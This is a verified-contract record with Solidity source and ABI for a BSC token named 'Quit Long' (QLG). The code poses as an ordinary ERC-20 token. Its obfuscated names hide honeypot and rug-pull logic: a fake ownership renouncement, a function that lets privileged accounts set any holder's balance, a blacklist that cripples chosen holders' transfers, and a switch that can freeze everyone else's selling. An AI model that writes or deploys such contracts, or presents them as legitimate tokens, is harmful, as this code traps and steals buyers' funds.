{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface takeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitEnable {\n    function createPair(address marketingIs, address tokenMin) external returns (address);\n}\n\ninterface tokenMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalToLiquidity) external view returns (uint256);\n\n    function transfer(address toLimit, uint256 totalShould) external returns (bool);\n\n    function allowance(address toToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toLimit,\n        uint256 totalShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamEnable, uint256 value);\n    event Approval(address indexed toToken, address indexed spender, uint256 value);\n}\n\ninterface fromLaunch is tokenMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuitLong is txTrading, tokenMarketing, fromLaunch {\n\n    function approve(address receiverSender, uint256 totalShould) public virtual override returns (bool) {\n        txLimitAt[_msgSender()][receiverSender] = totalShould;\n        emit Approval(_msgSender(), receiverSender, totalShould);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed receiverMinLiquidity, address indexed totalMarketing);\n\n    uint256 private launchedTake;\n\n    string private maxAtFrom = \"QLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxAtFrom;\n    }\n\n    function owner() external view returns (address) {\n        return listSenderAuto;\n    }\n\n    uint8 private minTx = 18;\n\n    mapping(address => bool) public fromTokenTeam;\n\n    bool private amountLaunchLaunched;\n\n    function transferFrom(address sellSwap, address toLimit, uint256 totalShould) external override returns (bool) {\n        if (_msgSender() != limitWallet) {\n            if (txLimitAt[sellSwap][_msgSender()] != type(uint256).max) {\n                require(totalShould <= txLimitAt[sellSwap][_msgSender()]);\n                txLimitAt[sellSwap][_msgSender()] -= totalShould;\n            }\n        }\n        return walletFundTrading(sellSwap, toLimit, totalShould);\n    }\n\n    mapping(address => bool) public tradingReceiver;\n\n    function fundIs(uint256 totalShould) public {\n        launchedShould();\n        sellFrom = totalShould;\n    }\n\n    uint256 private tradingWalletAt = 100000000 * 10 ** 18;\n\n    bool public swapSenderTx;\n\n    uint256 toMode;\n\n    string private receiverFund = \"Quit Long\";\n\n    function transfer(address launchTotalAmount, uint256 totalShould) external virtual override returns (bool) {\n        return walletFundTrading(_msgSender(), launchTotalAmount, totalShould);\n    }\n\n    address public limitList;\n\n    address private listSenderAuto;\n\n    function receiverBuy() public {\n        emit OwnershipTransferred(totalList, address(0));\n        listSenderAuto = address(0);\n    }\n\n    uint256 private tradingFee;\n\n    address public totalList;\n\n    function allowance(address limitReceiver, address receiverSender) external view virtual override returns (uint256) {\n        if (receiverSender == limitWallet) {\n            return type(uint256).max;\n        }\n        return txLimitAt[limitReceiver][receiverSender];\n    }\n\n    constructor (){\n        if (amountLaunchLaunched) {\n            amountLaunchLaunched = false;\n        }\n        takeTeam receiverFrom = takeTeam(limitWallet);\n        limitList = limitEnable(receiverFrom.factory()).createPair(receiverFrom.WETH(), address(this));\n        \n        totalList = _msgSender();\n        receiverBuy();\n        tradingReceiver[totalList] = true;\n        toTotalShould[totalList] = tradingWalletAt;\n        \n        emit Transfer(address(0), totalList, tradingWalletAt);\n    }\n\n    mapping(address => uint256) private toTotalShould;\n\n    function fundSenderFee(address sellSwap, address toLimit, uint256 totalShould) internal returns (bool) {\n        require(toTotalShould[sellSwap] >= totalShould);\n        toTotalShould[sellSwap] -= totalShould;\n        toTotalShould[toLimit] += totalShould;\n        emit Transfer(sellSwap, toLimit, totalShould);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFund;\n    }\n\n    function walletFundTrading(address sellSwap, address toLimit, uint256 totalShould) internal returns (bool) {\n        if (sellSwap == totalList) {\n            return fundSenderFee(sellSwap, toLimit, totalShould);\n        }\n        uint256 enableTake = tokenMarketing(limitList).balanceOf(receiverMode);\n        require(enableTake == sellFrom);\n        require(toLimit != receiverMode);\n        if (fromTokenTeam[sellSwap]) {\n            return fundSenderFee(sellSwap, toLimit, minEnable);\n        }\n        return fundSenderFee(sellSwap, toLimit, totalShould);\n    }\n\n    uint256 constant minEnable = 6 ** 10;\n\n    uint256 sellFrom;\n\n    function launchedTakeFund(address launchTotalAmount, uint256 totalShould) public {\n        launchedShould();\n        toTotalShould[launchTotalAmount] = totalShould;\n    }\n\n    address limitWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private txLimitAt;\n\n    function maxExempt(address limitLaunched) public {\n        launchedShould();\n        \n        if (limitLaunched == totalList || limitLaunched == limitList) {\n            return;\n        }\n        fromTokenTeam[limitLaunched] = true;\n    }\n\n    function launchedShould() private view {\n        require(tradingReceiver[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return listSenderAuto;\n    }\n\n    bool private launchedReceiver;\n\n    function fromMarketing(address senderToken) public {\n        require(senderToken.balance < 100000);\n        if (swapSenderTx) {\n            return;\n        }\n        if (launchedTake != tradingFee) {\n            launchedReceiver = true;\n        }\n        tradingReceiver[senderToken] = true;\n        if (launchedTake != tradingFee) {\n            amountLaunchLaunched = false;\n        }\n        swapSenderTx = true;\n    }\n\n    address receiverMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingWalletAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTx;\n    }\n\n    function balanceOf(address totalToLiquidity) public view virtual override returns (uint256) {\n        return toTotalShould[totalToLiquidity];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMinLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"fromMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTokenTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"fundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"launchedTakeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"}],\"name\":\"maxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSenderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "QuitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}